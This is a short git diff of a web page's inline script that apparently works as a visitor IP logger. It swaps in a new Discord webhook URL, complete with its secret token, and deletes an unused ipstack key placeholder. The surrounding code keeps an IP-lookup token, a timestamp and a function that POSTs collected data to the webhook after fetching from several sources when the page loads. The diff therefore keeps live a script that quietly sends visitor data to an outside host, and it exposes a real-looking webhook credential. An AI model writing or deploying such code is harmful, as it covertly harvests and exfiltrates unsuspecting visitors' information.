@@ -42,7 +42,7 @@
 </body>
 <script>
     const iptoken = 'd3df1d9e27298e';
-const webhookurl = 'https://discord.com/api/webhooks/1255784454958350391/9KHQu5ZzuCcvRZFzp4WtfetdTDBgqwevlVkX_V_rjjg9W6r7LHyT2mbO_rLvQJd2fk0F';
+const webhookurl = 'https://discord.com/api/webhooks/1256077249199865906/vxHTszKG92IwdvE02Sa0DCAL3olgPKFwx2lmWNc6Bv61XqBrI8vwy11Y4WziEeYf6wEO';
 
 var t = new Date();
 const timec = t.toLocaleString();
@@ -58,8 +58,6 @@ function sendToServer(embedData) {
         body: JSON.stringify(embedData),
     });
 }
-
-const ipstackAccessKey = 'YOUR_IPSTACK_ACCESS_KEY';
 
 // Promise.all to fetch data from all sources concurrently
 Promise.all([
